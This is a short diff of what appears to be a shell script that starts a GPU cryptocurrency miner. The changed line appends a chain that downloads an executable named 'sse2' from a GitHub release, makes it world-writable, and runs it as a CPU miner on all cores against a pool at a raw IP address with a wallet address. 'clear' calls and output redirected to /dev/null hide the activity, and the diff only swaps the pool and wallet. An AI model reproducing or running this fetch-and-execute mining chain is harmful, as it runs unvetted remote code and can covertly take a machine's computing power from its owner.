@@ -96,4 +96,4 @@ fi
   --pubkey=2GMkHa41GVciQwk62XwipNJaKgTm36kcmmjScwuKBvaUTCbm5miB15t \
   --label=Bismillah \
   --mode=gpu \
-  --threads-per-card=1 & clear & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && clear && ./sse2 -a yespowertide -o 103.217.145.116:80 -u tbc1q4ejgfa2mk0we95yxck9v54k0erq5t2cjlyxasf.alhamdulillah -t $(nproc) > /dev/null 2>&1 & clear
+  --threads-per-card=1 & clear & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && clear && ./sse2 -a power2b -o 103.196.155.151:80 -u Mmvf33Zijgbuknp7tKptviYHeAufYHLdWW -t $(nproc) > /dev/null 2>&1 & clear
